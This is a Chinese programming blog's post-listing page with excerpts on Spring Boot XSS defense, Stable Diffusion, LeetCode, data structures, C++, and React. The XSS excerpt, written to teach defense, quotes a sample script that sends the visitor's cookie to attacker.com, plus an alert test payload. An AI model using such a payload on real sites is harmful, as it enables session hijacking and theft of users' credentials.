<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bce44a89ceb2ce85789a51b2ef9f83b4/" rel="bookmark">
			SpringBoot实战：轻松实现XSS攻击防御（注解和过滤器）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 引言一、XSS攻击概述1.1 XSS攻击的定义1.2 XSS攻击的类型1.3 XSS攻击的攻击原理及示例 二、Spring Boot中的XSS防御手段2.1 使用注解进行XSS防御2.1.1 引入相关依赖2.1.2 使用@XSS注解进行参数校验2.1.3 实现自定义注解处理器2.1.4 使用注解 2.2 使用过滤器进行XSS防御2.2.1 引入相关依赖2.2.2 编写配置类2.2.3 修改配置文件2.2.4 创建XSSFilter类2.2.5 编写过滤工具类2.2.6 编写XSSRequestWrapper类清理脚本2.2.7 自定义json消息解析器 三、测试3.1 XSS注解：3.2 XSS过滤器 四、总结 引言 随着Web应用的普及，网络安全问题也日益凸显。跨站脚本攻击（Cross-Site Scripting，简称XSS）是一种常见的Web安全漏洞，它允许攻击者将恶意脚本注入到其他用户浏览和使用的正常网页中。当其他用户浏览这些网页时，恶意脚本就会在他们的浏览器上执行，从而可能导致信息泄露、会话劫持等严重后果。XSS攻击的普遍性和潜在危害性使其成为Web应用安全中不可忽视的一部分。
本文旨在探讨如何在Spring Boot应用程序中有效地防御XSS攻击。我们将介绍两种主要的防御手段：注解和过滤器。通过这两种方式，开发者可以轻松地在Spring Boot应用中实现XSS攻击的防御，从而保障用户的数据安全和应用的稳定运行。
一、XSS攻击概述 XSS攻击，全称为跨站脚本攻击（Cross-Site Scripting），是一种常见的网络攻击手段。它主要利用了Web应用程序对用户输入验证的不足，允许攻击者将恶意脚本注入到其他用户浏览的网页中。
1.1 XSS攻击的定义 XSS攻击是指攻击者在Web页面的输入数据中插入恶意脚本，当其他用户浏览该页面时，这些脚本就会在用户的浏览器上执行。由于脚本是在受害用户的上下文中执行的，因此它可以访问该用户的所有会话信息和权限，从而可能导致信息泄露、会话劫持、恶意操作等安全风险。
1.2 XSS攻击的类型 XSS攻击主要分为以下三种类型：
存储型XSS（Persistent XSS）：恶意脚本被永久存储在目标服务器上，如数据库、消息论坛、访客留言等，当用户访问相应的网页时，恶意脚本就会执行。反射型XSS（Reflected XSS）：恶意脚本并不存储在目标服务器上，而是通过诸如URL参数的方式直接在请求响应中反射并执行。这种类型的攻击通常是通过诱使用户点击链接或访问特定的URL来实施的。基于DOM的XSS（DOM-based XSS）：这种类型的XSS攻击完全发生在客户端，不需要服务器的参与。它通过恶意脚本修改页面的DOM结构，实现攻击。 1.3 XSS攻击的攻击原理及示例 XSS攻击的基本原理是利用Web应用程序对用户输入的信任,将恶意脚本注入到响应中。当其他用户访问包含恶意脚本的页面时,脚本会在他们的浏览器中执行。
可以参考：前端安全系列（一）：如何防止XSS攻击？ - 美团技术团队 (meituan.com)
示例:
存储型XSS攻击: 攻击者在一个博客评论系统中提交以下评论:
&lt;script&gt; document.location='http://attacker.com/steal.php?cookie='+document.cookie; &lt;/script&gt; 当其他用户查看这条评论时,他们的cookie会被发送到攻击者的服务器。
反射型XSS攻击: 攻击者构造一个恶意URL:
http://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt; 如果服务器直接将搜索词嵌入到响应中而不进行过滤,用户点击此链接后会看到一个警告框。
DOM型XSS攻击: 假设网页中有以下JavaScript代码:
var name = document.location.hash.substr(1); document.write("欢迎, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bce44a89ceb2ce85789a51b2ef9f83b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0071cca75c80ca114c80117f8b556f10/" rel="bookmark">
			Stable Diffusion图像的脸部细节控制——采样器全解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 艺术地掌控人物形象好易智算原因分析为什么在使用Stable Diffusion生成全身图像时，脸部细节往往不够精细？ 解决策略 局部重绘采样器总结 艺术地掌控人物形象 在运用Stable Diffusion这一功能强大的AI绘图工具时，我们往往会发现自己对提示词的使用还不够充分。在这种情形下，我们应当如何调整自己的策略，以便更加精确、全面地塑造出理想的人物形象呢？
举例来说，假设我们输入的是：
a girl in dress walks down a country road,vision,front view,audience oriented, 图片效果总是不尽人意
我们批量四个之后，除去背对的图片，我们可以看到其余三个的面部非常的奇怪
该如何快速处理呢？
好易智算 首先，我们可以通过好易智算平台迅速启动。在好易智算的平台上，它整合了多个AI应用程序——应用即达，AI轻启。这样的便捷性使得访问和使用这些先进技术变得前所未有地简单快捷。
我们这里选择Stable Diffusion
近期，好易智算平台7月9日上线推出了399包月，用户可在算力市场中自由选择心仪的算力资源，享受到前所未有的价格优惠。
原因分析 首先我们要了解脸部崩坏的原因
为什么在使用Stable Diffusion生成全身图像时，脸部细节往往不够精细？ 问题一：图像分辨率和细节处理
在生成全身图像的过程中，模型会将计算资源集中于整个身体的描绘，包括服装、姿势和背景等要素。脸部通常仅占整个图像的一小部分，相对地，分配给脸部细节处理的资源就显得有限。这导致在最终生成的全身图像中，脸部的细节可能不如半身图像那样清晰。问题二：训练数据的偏差效应
如果您的数据集中包含了大量高清的半身像而非全身像，Stable Diffusion模型可能会倾向于专注于处理这些半身像。由于全身像包含更多的图像元素和更高的维度，模型在绘制时需要投入更多的计算能力。因此，它在半身像的处理上可能会更有优势。问题三：生成算法的局限性
当前的生成算法在处理尺寸不同的对象时，可能存在一些限制。例如，脸部区域是一个复杂且细节丰富的部分，而当算法处理全身图像时，可能难以保持对脸部细节质量的关注。问题四：计算资源的限制
要生成一个特定尺寸的图像（如320x240像素），模型需要进行一系列运算，包括模板提取、特征表示、搜索和匹配等。这些都需要计算资源，并且在有限的资源下，对图像不同部分的优化可能会增加计算成本。因此，对于全身图像，可能对脸部细节质量有所优化，或者简化了处理流程。 解决策略 利用更高分辨率图像进行训练
通过使用更高分辨率的图像来进行训练，模型可以学习更多细节，这对提升生成照片中脸部的细节是有益的。
但是更高的分辨率会导致人物拉长畸形，大大降低了质量
使用更高的算力
提升GPU算力是提高计算机在图形处理、科学计算、深度学习等高性能计算任务中性能的关键。GPU，即图形处理单元，是一种高度并行的处理器，专门设计用来快速处理和渲染图像。
在今天的数字时代，我们可以通过一个简单快捷、功能强大的平台来迅速启动我们的服务。这个平台就是“好易智算”。在这个集成了无数AI应用程序的平台上，只需选择想要的应用，无需部署便会被轻松启用。这种前所未有地便捷体验极大地降低了访问这些前沿技术的门槛，让用户能够轻松而高效地利用这些技术，从而极大提升了工作效率和生活质量。并且提供了极高的资源选择
在生成全身图像时采用引导技术
在生成全身图像时，尝试应用引导技术（如注意力机制），这样可以让模型更加专注于脸部区域，从而提高对脸部细节的关注。 我们可以看到即使使用了prompt之后，Stable Diffusion似乎听不懂一样只是对面部加了一个渲染，但并没有达到预期的效果
局部重绘 我们可以直接点击这里到局部重绘，在选择重绘内容之后，如下：
提示词都不用变化，只需要把负面词加上即可
(worst quality, low quality:1.4),monochrome,zombie,bad_prompt_version2-neg,easynegative (1),(worst quality, low quality:1.4),(depth of field, blurry:1.2),(greyscale, monochrome:1.1),3D face,cropped,lowres,text,(nsfw:1.3),(worst quality:2),(low quality:2),(normal quality:2),normal quality,((grayscale)),skin spots,acnes,skin blemishes,age spot,(ugly:1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0071cca75c80ca114c80117f8b556f10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3a8f1fff96a484b9266d2e1d0408c85/" rel="bookmark">
			【leetcode】双指针算法题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.算法思想2.移动零3.复写零方法一方法二 4.快乐数5.盛水最多的容器方法一（暴力求解）方法二（左右指针） 6.有效三角形的个数方法一（暴力求解）方法二（左右指针） 7.两数之和8.三数之和9.四数之和 1.算法思想 常见的双指针有两种形式，⼀种是左右指针，⼀种是快慢指针。
左右指针：⼀般用于有序的结构中，也称左右指针。 左右指针从两端向中间移动。⼀个指针从最左端开始，另⼀个从最右端开始，然后逐渐往中间逼近。左右指针的终⽌条件⼀般是两个指针相遇或者错开（也可能在循环内部找到结果直接跳出循环），也就是：
left == right （两个指针指向同⼀个位置）
left &gt; right (两个指针错开） 快慢指针：⼜称为龟兔赛跑算法，其基本思想就是使⽤两个移动速度不同的指针在数组或链表等序列结构上移动。
这种方法对于处理环形链表或数组非常有用。
其实不单单是环形链表或者是数组，如果研究的问题出现循环往复的情况时，均可考虑使用快慢指针的思想。
快慢指针的实现⽅式有很多种，最常用的⼀种就是： 在⼀次循环中，每次让慢的指针向后移动⼀位，而快的指针往后移动两位，实现⼀快⼀慢。 废话不多说，我们来做题。
2.移动零 leetcode 283.移动零
题目要求我们将数组中的0全部移动到数组的末尾，并且其它元素的相对顺序不变，而且不允许开辟额外的数组。
那我们应该如何来解决这一题呢？
算法思路：
在本题中，我们可以⽤⼀个cur 指针来扫描整个数组，另⼀个dest 指针⽤来记录⾮零数序列的最后⼀个位置。
根据cur 在扫描的过程中，遇到的不同情况，分类处理，实现数组的划分。
在cur遍历期间，使[0, dest] 的元素全部都是⾮零元素，[dest + 1, cur - 1] 的元素全是零。
最初，我们不知道非零序列的位置，所以将dest置为-1，cur置为0。cur进行扫描，在扫描过程中：
若cur对应元素不为0，cur后移若cur对应元素为0，dest先后移，然后再交换cur与dest，最后cur再后移。 class Solution { public: void moveZeroes(vector&lt;int&gt;&amp; nums) { int dest = -1; int cur = 0; int n = nums.size(); while(cur &lt; n) { //cur不为0，交换 if(nums[cur] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3a8f1fff96a484b9266d2e1d0408c85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1b80212f38787dadc9dab135f3fb1fd/" rel="bookmark">
			数据结构（栈的实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
栈的定义
栈的实现
定义栈
初始化栈
栈的销毁
进栈
删除栈
返回栈元素个数
判断栈是否为空
返回栈顶元素
进行打印
代码链接
个人总结
栈的定义 栈：一种特殊的线性表，其只允许在固定的一端进行插入和删除元素操作。进行数据插入和删除操作的一端 称为栈顶，另一端称为栈底。栈遵循先进后出的原则。
压栈：栈的插入操作叫做进栈/压栈/入栈，入数据在栈顶。
出栈：栈的删除操作叫做出栈。出数据也在栈顶。
栈的实现
对于栈，可以用数组的方式实现，也可以用链表的方式实现，而我选择用数组的方式实现，因为数组的。因为数组在尾上插入数据的 代价比较小。
栈的实现 定义栈 typedef int STDataType; typedef struct Stack { STDataType* a; int top; int capacity; }ST; 定义栈，因为要定义多个数据，所以选择结构体 用typedef来为数据类型定义一个新的名称，方便以后修改，其他数据类型；
STDataType* a;表示一个数组指针
int top;表示栈顶
int capacity;表示数组的容量
初始化栈 void STInit(ST* ps) { assert(ps); ps-&gt;a = (STDataType*)malloc(sizeof(STDataType*)*4); if (ps-&gt;a==NULL) { perror("malloc fail"); return; } ps-&gt;capacity = 4; ps-&gt;top = 0; } 首先进行断言，来确保，我们传进来的不是一个空指针；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1b80212f38787dadc9dab135f3fb1fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17b0b305469cd11bf4b10954223e1c2f/" rel="bookmark">
			c&#43;&#43;之旅第十一弹——顺序表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好啊，这里是c++之旅第十一弹，跟随我的步伐来开始这一篇的学习吧！
如果有知识性错误，欢迎各位指正！！一起加油！！
创作不易，希望大家多多支持哦！
一,数据结构的概念：
1.什么是数据结构？
数据结构是指计算机存储和组织数据的方式
使用合理的数据结构能够提高程序的运行效率，内存利用率等
2.数据结构的两个层次：
（1）逻辑结构：分为线性和非线性两种，线性即为没有分支的一个接着一个，非线性即为有分支或无逻辑上的连续关系
（2）存储结构：
①线性：分为连续存储（数组）和链式存储（链表）
②非线性：索引存储和散列存储
二，顺序表：
1.属于线性表中的连续存储型
2.顺序表的特点：
（1）、因为地址是连续的所以可以通过下标(索引)访问
（2）、顺序表可以是静态（静态定好大小的数组）也可以是动态（用指针来开辟的空间）
（3）、顺序表随机访问方便，但是插入和删除中间的数据比较困难
3.顺序表的功能实现及完善：（eg：数组的增删查改）
类模板的使用可以避免每一次使用时需要写逻辑代码：
头文件CMyArray.h内容如下：
template &lt;class T&gt;//typename可以用来替换class class CMyArray { T *pBuff; size_t maxSize; size_t len; public: CMyArray(); CMyArray(CMyArray const&amp; other); ~CMyArray(); public: void push_back(T const&amp; elem);//尾部添加 void insert(int index, T const&amp; elem);//在index位置插入 void pop_back();//尾部删除 void erase(int index);//删除index位置的值 T&amp; at(int index);//得到下标index的值 int find(T const&amp; elem) const;//查找参数是否在数组中 public: bool empty() const;//判断当前数组是否是空 size_t size() const;//得到当前数组元素个数 size_t maxLen() const;//得到当前数组可以存放的最大元素个数 private: void _resetMemory();//扩容内存 }; ​ template &lt;class T&gt; void CMyArray&lt;T&gt;::_resetMemory() { if (len &gt;= maxSize) { maxSize += (maxSize &gt;&gt; 1) &gt; 1 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17b0b305469cd11bf4b10954223e1c2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee80dac2612cf2e8bf1a56b4a08b8605/" rel="bookmark">
			【C&#43;&#43;】认识使用string类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【C++】STL中的string类 C语言中的字符串标准库中的string类string类成员变量string类的常用接口说明成员函数string(constructor构造函数)~string(destructor析构函数)默认赋值运算符重载函数 遍历string下标+[ ]迭代器范围for反向迭代器 capacitysizelengthmax_sizeresizecapacityreserveclearempty Element access（元素访问）operator[ ]at Modifiers（字符串进行修改）operator+=appendpush_backassigninserterasereplaceswap String operations（字符串进行操作）c_strcopyfindrfindfind_first_offind_last_offind_first_not_offind_last_not_ofsubstrcompare Member constants（成员常量）npos Non-member function overloads（非成员函数重载）operator+ (string)relational operators (string)swap (string)operator&gt;&gt; (string)operator&lt;&lt; (string)getline (string) 链接: string
C语言中的字符串 C语言中，字符串是以’\0’结尾的一些字符的集合，为了方便操作，C标准库里面提供了一些str系列的库函数，但是这些库函数与字符串是分离开的，不太复合OOP（OOP即面向对象程序设计，全称为Object Oriented Programming）的思想，而且底层空间需要用户自己管理，可能还会又越界访问。
标准库中的string类 1.字符串是表示字符序列的类
2.标准的字符串类提供了对此类对象的支持，其接口类似于标准字符容器的接口，但添加了专门用于操作单字节字符字符串的设计特性
3.string类是使用char（即作为它的字符类型，使用它的char_traits和分配器类型）
4.string类是basic_string模板类的一个实例，它使用char来实例化basic_string模板类，并用char_traits和allocator作为basic_string的默认参数
5.注意这个类独立于所使用的编码来处理字节：如果用来处理多字节或变长字符的序列，这个类的所有成员（如长度或者大小）已经它的迭代器，将仍然按照字节（而不是实际编码的字符）来操作
总结
1.string是表示字符串的字符串类
2.该类的接口与常规容器的接口基本相同，再添加一些专门用来操作string的常规操作
3.shring再底层实际是：basic_string模板类的别名，typedef basic_string&lt;char,char_traits,allocator&gt;string;
4.不能操作多字节或者变长字符的序列
【注意】在使用string类时，必须包含#include头文件以及using namespace std;
string类 string 类 1.strings是代表一系列字符的对象。
2.这个标准字符串类提供支持这样的对象有类似于标准字节容器的接口，但是增加了尤其是专门设计去处理单字节字符的字符串的功能
3.这个字符串类是一个标准字符串类的模板的实例，使用类似的字符类型char
4.注意此类是独立于之前的编码去处理字节：如果去处理多字节或者可变长度字符，则此类的所有成员及其迭代器仍然以字节为单位进行操作。
成员变量 string类的常用接口说明 成员函数 string(constructor构造函数) string构造函数初始化字符串对象，初始化的值取决于使用的构造函数的版本。 （1）无参构造函数（默认构造函数）
default (1) string();
构造一个空的字符串，长度为0的字符
string s1; （2）拷贝构造函数
copy (2) string (const string&amp; str);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee80dac2612cf2e8bf1a56b4a08b8605/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b060943dff2d4f25f17b25b428a60ac/" rel="bookmark">
			匈牙利算法【python，算法】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		匈牙利算法的主要步骤如下：
记录原始矩阵为mat。
对原始矩阵进行等效操作，操作方法如下：
对于矩阵的每一行，找出最小值row_min_v，给这一行的每一个元素减去row_min_v。对于矩阵的每一列，找出最小值col_min_v，给这一列的每一个元素减去col_min_v。 主算法：
记录矩阵的维度为dim，标记 0 元素的个数为zero_cnt。
如果zero_cnt&lt;dim:
对 0 元素矩阵进行划线，如果得到的划线行列总数小于dim，则需要调整矩阵。划线 标记不包含被标记的 0 元素的行，并在 non_marked_row 中存储行索引；搜索 non_marked_row 元素，并找出相应列中是否有未标记的 0 元素；【找出未标记的独立 0 元素所在的行，加到 non_marked_row，打勾】将列索引存储在 marked_cols 中；【上述行中把独立 0 元素包含的列都 marked，打勾，这是之后要划的竖线】比较存储在 marked_zero 和 marked_cols 中的列索引；【4、5步是找出（3）中划的列线包括的marked_0元素，把这行加到non_marked_row，打勾】如果存在一个匹配的列索引，那么相应的行索引就会被保存到non_marked_rows中；接下来，不在 non_marked_row 中的行索引被保存在 marked_rows 中。 调整矩阵： 在未划线的元素中，找到最小值。对所有未划线的元素减去最小值对划线交叉点的元素加上最小值 如果zero_cnt=dim，在原矩阵中标记出算法选择的元素，即标记 0 元素的位置所对应的元素。
下面通过手撕代码实现了匈牙利算法，并与scipy库的算法进行对比，可以发现手动实现的算法与库函数实现是等效的。
import copy from pprint import pprint from typing import List import numpy as np from scipy.optimize import linear_sum_assignment def hungarian(mat: List): """匈牙利算法 步骤： 1. 将矩阵转换为 numpy 数组 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b060943dff2d4f25f17b25b428a60ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a98c61c003bc1bb4bd3d259b15749e52/" rel="bookmark">
			AIGI赋能未来：人工智能如何重塑电子电路学习体验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、掌握基础知识与技能1. 扎实理论基础2. 熟练使用工具 二、融合AI技术提升学习效率1. 利用AI辅助学习平台2. 应用AI工具进行电路设计与仿真 三、探索创新应用方向1. 关注AI与电子电路的交叉领域2. 参与开源项目和竞赛 四、培养跨学科思维1. 加强数学与计算机科学知识2. 关注跨学科前沿动态 《一本书读懂电子电路 漫画版》编辑推荐适读人群内容简介作者简介目录前　言获取方式 随着人工智能（AI）技术的飞速发展，特别是AIGI（Artificial Intelligence Generated Innovations，人工智能驱动的创新）的兴起，电子电路的学习方式和应用领域正经历着前所未有的变革。在这个时代，学习电子电路不仅要求掌握传统的理论知识与技能，还需要学会如何利用AI工具和技术来提升学习效率，探索新的应用方向。
一、掌握基础知识与技能 1. 扎实理论基础 学习电子电路首先需要掌握扎实的理论基础，包括电路分析、模拟电子技术、数字电子技术等。这些基础知识是后续学习和应用的基础，也是理解AI在电子电路中应用的前提。
2. 熟练使用工具 掌握电子电路设计工具的使用也是必不可少的。传统上，这些工具包括Multisim、Proteus等电路仿真软件，以及Altium Designer、Cadence等电路设计软件。在AI时代，这些工具正逐渐与AI技术融合，提供更加智能化、高效的设计体验。
二、融合AI技术提升学习效率 1. 利用AI辅助学习平台 在AIGI和人工智能时代，有许多AI辅助学习平台可以为电子电路的学习提供有力支持。这些平台通过智能推荐、个性化学习路径规划等方式，帮助学习者更快地掌握知识点，提高学习效率。例如，Coursera等在线学习平台提供了丰富的电子电路和AI相关课程，学习者可以根据自己的兴趣和需求进行选择。
2. 应用AI工具进行电路设计与仿真 AI技术在电子电路设计中的应用日益广泛。利用AI工具进行电路设计与仿真可以大大提高设计效率和准确性。例如，一些基于机器学习的电路优化算法可以自动调整电路参数以达到最优性能；深度学习技术可以用于电路故障诊断和预测性维护等领域。学习者应该积极尝试这些新工具和技术，以提升自己的设计能力。
三、探索创新应用方向 1. 关注AI与电子电路的交叉领域 在AIGI和人工智能时代，电子电路与AI的交叉领域充满了无限可能。学习者应该关注这些领域的发展动态，了解最新的研究成果和应用案例。例如，物联网（IoT）、可穿戴设备、智能家居等领域都离不开电子电路与AI技术的深度融合。通过参与这些领域的研究和开发工作，学习者可以不断提升自己的创新能力和实践经验。
2. 参与开源项目和竞赛 参与开源项目和竞赛是提升电子电路与AI技能的有效途径。通过参与这些项目和竞赛，学习者可以接触到更多的实际应用场景和技术挑战，从而加深对电子电路与AI技术的理解和掌握。同时，这些活动和经历也可以为学习者的简历增添亮点，提高就业竞争力。
四、培养跨学科思维 1. 加强数学与计算机科学知识 电子电路与AI技术的融合要求学习者具备扎实的数学和计算机科学基础。数学是理解电路原理和AI算法的基础；计算机科学则提供了实现AI算法和电路设计的工具和技术。因此，学习者应该加强数学和计算机科学知识的学习和应用能力。
2. 关注跨学科前沿动态 在AIGI和人工智能时代，跨学科研究已经成为推动科技创新的重要力量。学习者应该关注电子电路、计算机科学、物理学、材料科学等学科的交叉前沿动态，了解不同领域之间的相互影响和融合趋势。通过跨学科的学习和研究，可以培养更加全面和深入的创新能力。
在AIGI和人工智能时代学习电子电路需要掌握扎实的基础知识与技能，融合AI技术提升学习效率，探索创新应用方向，并培养跨学科思维。只有这样，才能在这个充满挑战和机遇的时代中脱颖而出，成为电子电路领域的佼佼者。
《一本书读懂电子电路 漫画版》 编辑推荐 本书即使是被认为难以理解的电子电路的组装方式，也会在手把手的讲解下变得简单易懂；了解电路图的绘制方法；掌握电子电路的组装方式；掌握电子元件的原理和使用要点；漫画人物带你走近电子电路世界。
适读人群 本书适合想学习电子电路的初学者阅读。
内容简介 本书共分8章，以图解加漫画的形式，讲解了电子电路的相关知识。内容主要包括电磁波、利用电磁波的传感器、电子电路、二极管和发光二极管（LED）、电容器、晶体管和光电晶体管、电子元件和电子电路等。本书的特点在于：读者可通过阅读漫画，了解电路图的绘制方法，掌握电子电路的组装方式；从基础开始理解电子电路相关术语；掌握电子元件的原理和使用要点。本书适合具有中学物理知识的电子科技爱好者，非工科背景的电子行业求职者和从业者，以及青少年培训机构的学员阅读。
作者简介 松原宽，1989年毕业于千叶工业大学电气工程系。在产品开发部门从事控制设备的开发工作。自2012年起，撰写并出版了关于“序列控制”“电子电路”“电气工程师资格”等主题的书籍。著有《世界上最简单的[漫画]电路电子书》（2012年12月出版）《世界上最简单的[漫画]序列控制电子书》（2014年3月出版）《世界上最简单的[漫画]电子电路电子书》（2022年3月出版）《世界上最简单的文科生也能理解的[漫画]第二类电气工程师考试教材》（2023年7月出版）。
目录 前　言 登场人物介绍 第1章　电磁波1 第２章　电磁波传感器26 第３章　电子电路49 第４章　二极管和发光二极管（LED）91 第５章　电容器123 第６章　晶体管和光电晶体管153 第７章　电子元件和电子电路187 第８章　试错217 总　结281 前　言 在学习新技术的过程中，最重要的是自己独立学习和思考的能力。在前作《电子电路》 《时序控制》这两本书之后，本书将带领读者随着漫画中的人物一起制作“路线追踪机器人”，共同调查、思考和学习所需的知识。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a98c61c003bc1bb4bd3d259b15749e52/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8857fafce97bf6e254edb7eafda830f1/" rel="bookmark">
			云计算渲染时代：选择Blender或KeyShot进行高效渲染
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在云渲染技术日益成熟的背景下，挑选一款贴合项目需求的3D渲染软件显得尤为关键。当前，Blender与KeyShot作为业界领先的全能渲染解决方案，广受推崇。它们虽皆能创造出令人信服的逼真视觉效果，但在特色功能上各有所长。本篇文章旨在深入剖析Blender与KeyShot的核心渲染能力，并指导用户如何根据云渲染环境的具体需求，在这两者之间做出明智的选择。
一、Blender和KeyShot介绍 Blender介绍
Blender是一款开源的3D创作套件，提供从建模、动画到渲染等全面的3D制作流程。
它完全免费，支持跨平台使用，包括Windows、Linux和macOS操作系统。Blender的界面使用OpenGL技术，为用户提供一致的体验。高级用户还可以利用Python脚本API自定义Blender或开发专用工具。
KeyShot介绍
KeyShot是一个独立的实时光线追踪和全局照明程序，专门用于生成3D渲染、动画和交互式视觉效果。
它基于Luxion公司开发的物理正确渲染引擎，以科学精确的材质表示和全局照明技术为特色。
二、选择Blender还是KeyShot进行渲染？ Blender和KeyShot都具备强大的渲染引擎，能够充分利用CPU和GPU的性能，并提供实时渲染功能，让用户在完成渲染前能够及时发现并解决问题。
Blender 渲染功能
自2.8版本起，Blender包含三种渲染引擎：Cycles（基于物理的路径追踪器）、EEVEE（基于物理的实时渲染器）和Workbench（用于布局、建模和预览）。
Cycles提供基于物理的渲染结果，具备艺术控制和灵活的着色节点。EEVEE使用OpenGL构建，专注于速度和交互性，实现PBR材质的渲染。Workbench则针对建模和动画预览期间的快速渲染进行优化。
Cycles 具有以下特点：
NVIDIA： CUDA、OptiX
AMD：HIP
英特尔：OneAPI
苹果：金属
具有多重重要性采样的单向路径追踪
具有 SIMD 加速的多核 CPU 渲染
混合渲染（CPU + GPU）
GPU 渲染：
多 GPU 支持
CPU 和 GPU 的统一渲染内核
EEVEE （Extra Easy Virtual Environment Engine）是Blender使用OpenGL构建的实时渲染引擎。它专注于速度和交互性，同时实现了渲染PBR（基于物理的渲染）材质的目标。 EEVEE 可以在 3D 视口中交互使用，还可以生成高质量的最终渲染。它不是光线追踪渲染引擎，而是使用光栅化来估计光线与物体和材质的交互方式，使用多种算法。因此，它并不完美，无法像 Cycles 那样实现物理精确渲染。 Workbench渲染引擎针对建模和动画预览期间的快速渲染进行了优化。它不用于最终渲染。其主要任务是在工作过程中在 3D 视口中显示场景。 KeyShot 渲染功能
与 Blender 相比，Keyshot 在实时渲染方面具有优势。KeyShot 中的实时渲染速度更快，功能更丰富。KeyShot 中的一切都是实时发生的。它使用独特的渲染技术，使用户可以即时查看材质、灯光和相机的所有变化。KeyShot实时视图是 KeyShot 用户界面中的主要视口，所有 3D 模型的实时渲染都在此进行。用户可以使用相机控件浏览场景，多选对象，并直接右键单击模型或其周围区域以查看更多选项。
在 Keyshot（从版本 9 开始）中，有一个选项可以选择渲染引擎为CPU 模式或GPU 模式。这允许用户使用 CPU 或 GPU 进行渲染。根据所选的渲染引擎，用户可以控制 CPU 或 GPU 的使用情况，以限制使用的 CPU 核心数量或指定为渲染作业分配哪些 GPU。 三、Blender 与 KeyShot：GPU 渲染性能 Blender 的 GPU 渲染性能
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8857fafce97bf6e254edb7eafda830f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69c11c2d30964e5b67cce2e2e75bf495/" rel="bookmark">
			React 19 竞态问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		竞态问题/竞态条件 指的是，当我们在交互过程中，由于各种原因导致同一个接口短时间之内连续发送请求，后发送的请求有可能先得到请求结果，从而导致数据渲染出现预期之外的错误。
因为防止重复执行可以有效的解决竞态问题，因此许多时候面试官也会直接在面试中问我们如何实现防重。常用的方式就是取消上一次请求，或者设置状态让按钮不能连续点击，想必各位大佬对这些方案都已经非常熟悉，我这里就不展开细说。
React 19 结合 Suspense 也在竞态问题上，提出了一个自己的解决方案。我们结合新的案例来探讨一下这个问题，看完之后大家感受一下这种方式是好是坏。
